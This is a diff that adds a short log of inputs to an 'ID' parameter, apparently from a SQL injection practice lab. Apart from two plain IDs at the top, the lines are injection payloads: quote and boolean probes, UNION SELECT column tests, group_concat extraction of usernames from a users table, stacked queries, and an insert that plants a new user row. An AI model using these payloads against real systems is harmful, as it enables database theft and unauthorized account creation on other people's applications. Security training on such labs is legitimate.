@@ -1,0 +1,27 @@
+ID:1
+ID:2
+ID:1'
+ID:1'
+ID:1' or 1=1 #
+ID:1' and 1=1 #
+ID:1' and 1=2 #
+ID:1' and 1=1 #
+ID:-1' union select 1,2,3 #
+ID:-1' union select 1,2,3 #
+ID:-1' union select 1,group_concat(username),3 from users #
+ID:1';select * from users;
+ID:1';select * from users;
+ID:1';select * from users;
+ID:1';select * from users;
+ID:-1';select * from users;
+ID:-1';select 1,username,3 from users #
+ID:-1';select 1,username,3 from users; #
+ID:-1';select 1,username,3 from users; #
+ID:-1';select 1,group_concat(username),3 from users; #
+ID:-1';select 1,group_concat(username),3 from users; #
+ID:-1';select 1,group_concat(username),3 from users; #
+ID:-1';select 1,group_concat(username),3 from users; #
+ID:1';insert into users(id,username,password) values('17','aaa','bbb'); #
+ID:-1';insert into users(id,username,password) values('17','aaa','bbb'); #
+ID:1';insert into users(id,username,password) values('17','aaa','bbb'); #
+ID:1';insert into users(id,username,password) values('17','aaa','bbb'); #
